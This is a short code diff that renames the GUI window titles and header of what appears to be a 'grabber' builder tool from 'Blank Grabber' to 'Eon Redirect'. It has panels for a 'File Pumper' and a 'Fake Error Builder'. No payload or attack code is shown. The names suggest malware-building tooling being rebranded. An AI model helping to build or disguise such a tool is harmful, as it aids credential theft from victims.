@@ -619,7 +619,7 @@ class PumperSettings(ctk.CTkToplevel):
 
 	def __init__(self, master) -> None:
 		super().__init__(master)
-		self.title("Blank Grabber [File Pumper]")
+		self.title("Eon Redirect [File Pumper]")
 		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
 		self.grab_set()
 		self.geometry("500x200")
@@ -667,7 +667,7 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 
 	def __init__(self, master) -> None:
 		super().__init__(master)
-		self.title("Blank Grabber [Fake Error Builder]")
+		self.title("Eon Redirect [Fake Error Builder]")
 		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
 		self.grab_set()
 		self.geometry("833x563")
@@ -759,7 +759,7 @@ class Builder(ctk.CTk):
 		super().__init__()
 
 		ctk.set_appearance_mode("dark")
-		self.title("Blank Grabber [Builder]")
+		self.title("Eon Redirect [Builder]")
 		self.iconbitmap(os.path.join("Extras", "icon.ico"))
 		self.geometry("1250x600")
 		self.resizable(False, False)
@@ -770,7 +770,7 @@ class Builder(ctk.CTk):
 		self.columnconfigure(0, weight= 1)
 		self.columnconfigure(1, weight= 0)
 
-		self.titleLabel = ctk.CTkLabel(self, text= "Blank Grabber", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
+		self.titleLabel = ctk.CTkLabel(self, text= "Eon Redirect", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
 		self.titleLabel.grid(row= 0, column= 0)
 
 		self.builderOptions = BuilderOptionsFrame(self)
